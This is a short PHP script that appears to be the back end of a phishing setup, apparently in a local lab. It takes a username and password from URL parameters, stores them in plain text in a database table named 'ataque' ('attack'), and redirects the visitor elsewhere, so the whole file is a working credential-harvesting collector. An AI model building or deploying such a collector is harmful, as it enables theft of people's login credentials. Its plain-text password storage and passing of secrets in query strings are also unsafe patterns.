<?php
    header('Location: '."http://localhost:81");
    $hostname = "db";
    $username = "admin";
    $password = file_get_contents('/var/db_pass.txt');
    $db = "database";

    $usuario = $_GET["usuario"];
    $contrasena = $_GET["contrasena"];

    $conn = mysqli_connect($hostname,$username,$password,$db) or die(mysqli_error($conn));
    $query = mysqli_prepare($conn,"DELETE FROM ataque WHERE email=?") or die (mysqli_error($conn));
    mysqli_stmt_bind_param($query, "s", $us);
    $us = $usuario;
    mysqli_stmt_execute($query);
    mysqli_close($conn);

    $conn = mysqli_connect($hostname,$username,$password,$db);
    $query = mysqli_prepare($conn,"INSERT INTO ataque(email,pass) VALUES (?,?)") or die ("Error interno E890");
    mysqli_stmt_bind_param($query, "ss", $usr, $contr);
    $usr = $usuario;
    $contr = $contrasena;
    mysqli_stmt_execute($query);
    mysqli_close($conn);
?>